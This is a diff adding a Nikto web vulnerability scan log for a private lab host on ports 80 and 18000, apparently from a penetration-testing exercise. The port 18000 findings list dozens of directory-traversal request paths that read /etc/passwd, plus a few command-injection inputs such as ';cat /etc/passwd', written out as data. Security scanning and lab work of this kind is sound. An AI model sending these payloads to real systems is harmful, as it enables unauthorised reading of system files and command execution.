@@ -1,0 +1,72 @@
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.156.117
++ Target Hostname:    192.168.156.117
++ Target Port:        80
++ Start Time:         2022-05-26 10:51:55 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.37 (centos)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'tcn' found, with contents: choice
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.156.117
++ Target Hostname:    192.168.156.117
++ Target Port:        18000
++ Start Time:         2022-05-26 10:52:00 (GMT-4)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ Uncommon header 'x-request-id' found, with contents: a956d16b-88a7-46ef-8481-99ae27ed4899
++ Uncommon header 'x-runtime' found, with contents: 0.005900
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /trace.axd: The .NET IIS server has application tracing enabled. This could allow an attacker to view the last 50 web requests.
++ OSVDB-2400: /admin-serv/tasks/configuration/ViewLog?file=passwd&num=5000&str=&directories=admin-serv%2Flogs%2f..%2f..%2f..%2f..%2f..%2f..%2fetc&id=admin-serv: iPlanet Administration Server 5.1 allows remote users to download any file from the server. Upgrade to SunOne DS5.2 and in iDS5.1 SP2 Hotfix 2.
++ /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd: The Web_Server_4D is vulnerable to a directory traversal problem.
++ OSVDB-5553: /netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd: Sybex E-Trainer allows arbitrary files to be retrieved.
++ ///etc/passwd: The server install allows reading of any system file by adding an extra '/' to the URL.
++ OSVDB-50624: /albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd: Coppermine 1.0 RC3 may have been compromised to allow arbitrary file retreival. Upgrade to the latest at http://www.chezgreg.net/coppermine/
++ OSVDB-9028: /autohtml.php?op=modload&mainfile=x&name=/etc/passwd: php-proxima 6.0 and below allows arbitrary files to be retrieved.
++ OSVDB-49354: /atomicboard/index.php?location=../../../../../../../../../../etc/passwd: AtomicBoard v0.6.2 allows remote users to read arbitrary files.
++ OSVDB-54099: /current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1: w-agora 4.1.5 allows any file to be retrieved from the remote host.
++ OSVDB-3012: /current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00: w-agora 4.1.5 allows any file to be retrieved from the remote host.
++ OSVDB-54058: /typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version.
++ OSVDB-54058: /cms/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version.
++ OSVDB-54058: /site/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version.
++ OSVDB-54058: /typo/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version.
++ OSVDB-54058: /typo3/typo3/dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00: TYPO3 allows any file to be retrieved remotely. Upgrade to the latest version.
++ /DomainFiles/*//../../../../../../../../../../etc/passwd: Communigate Pro 4.0b to 4.0.2 allow any file to be retrieved from the remote system.
++ OSVDB-59600: /ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1: eZ httpbench version 1.1 allows any file on the remote server to be retrieved.
++ OSVDB-2870: /index.php?download=/etc/passwd: Snif 1.2.4 allows any file to be retrieved from the web server.
++ OSVDB-59085: /index.php?|=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.
++ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
++ OSVDB-59085: /index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd: Portix-PHP Portal allows retrieval of arbitrary files via the '..' type filtering problem.
++ /jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd: Default JRun CGI lets users read any system file.
++ OSVDB-51750: /k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor: Kebi Academy 2001 Web Solution allows any file to be retrieved from the remote system.
++ /nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0: nCUBE Server Manage 1.0 allows any file to be read on the remote system.
++ OSVDB-2829: /phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd: phpWebFileManager v2.0.0 and prior are vulnerable to a directory traversal bug.
++ /phptonuke.php?filnavn=/etc/passwd: Photonouke or myphpnuke allows arbitrary files to be retrieved from the remote host.
++ /put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd: NCR's Terradata server contains a CGI that allows any file to be retrieved remotely.
++ OSVDB-521: /ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00: The ROADS search.pl allows attackers to retrieve system files.
++ /support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd: This CGI allows attackers to read files on the host.
++ /viewpage.php?file=/etc/passwd: PHP-Nuke script viewpage.php allows any file to be retrieved from the remote system.
++ OSVDB-431: /Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html: eXtropia's Web Store lets attackers read any file on the system by appending a %00.html to the name.
++ OSVDB-9055: /webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif: Wolfram Research's webMathematica allows any file to be read on the remote system. Upgrade to the latest version on http://www.wolfram.com/
++ OSVDB-17110: /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00: The Novell Groupwise WebAcc Servlet allows attackers to view arbitrary files on the server.
++ /webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd: Webcalendar 0.9.41 and below allow remote users to read arbitrary files.
++ OSVDB-15392: /logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00|: Wordit Limited 2000 allows command execution.
++ OSVDB-59084: /page.cgi?../../../../../../../../../../etc/passwd: WWWeBBB Forum up to version 3.82beta allow arbitrary file retrieval.
++ OSVDB-56290: /edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd: EditTag allows arbitrary file retrieval.
++ OSVDB-8983: /base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1: Remote file retrieval.
++ OSVDB-16861: /athenareg.php?pass=%20;cat%20/etc/passwd: Athena web registration remote command execution.
++ OSVDB-278: /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd: This default Netscape file allows an attacker to read arbitrary files on the host.
++ /search?NS-query-pat=../../../../../../../../../../etc/passwd: The iPlanet server allows arbitrary files to be retrieved through the search functionality. Install 4.1 SP10+ or 6.0 SP3+
++ /../../../../../../../../../../etc/passwd: It is possible to read files on the server by adding ../ in front of file name.
++ /................../etc/passwd: The web server allows the password file to be retrieved.
++ /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd: Web server allows reading of files by sending encoded '../' requests. This server may be Boa (boa.org).
++ /ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd: It is possible to read files on the server by adding through directory traversal by adding multiple /\\.. in front of file name.
++ Scan terminated:  0 error(s) and 47 item(s) reported on remote host
++ End Time:           2022-05-26 10:57:32 (GMT-4) (332 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
